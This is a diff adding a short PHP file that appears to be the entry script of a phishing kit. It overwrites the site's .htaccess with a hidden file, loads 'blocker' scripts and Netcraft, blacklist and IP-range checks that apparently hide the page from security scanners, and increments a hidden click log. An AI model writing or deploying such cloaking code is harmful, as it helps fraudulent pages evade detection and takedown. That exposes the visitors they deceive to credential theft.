@@ -1,0 +1,18 @@
+<?php
+require_once "config.php";
+
+@unlink(".htaccess");
+@copy("._bstrd.txt",".htaccess");
+require "blocker.php";
+if ($proxb == "yeahpxb") {
+require "blocker2.php";
+}
+require "assets/includes/netcraft_check.php";
+require "assets/includes/blacklist_lookup.php";
+require "assets/includes/ip_range_check.php";
+$file2 = $_SERVER['DOCUMENT_ROOT'] . "/assets/logs/._click_.txt";
+$isi = @file_get_contents($file2);
+$buka = fopen($file2, "w");
+fwrite($buka, $isi + 1);
+
+?>
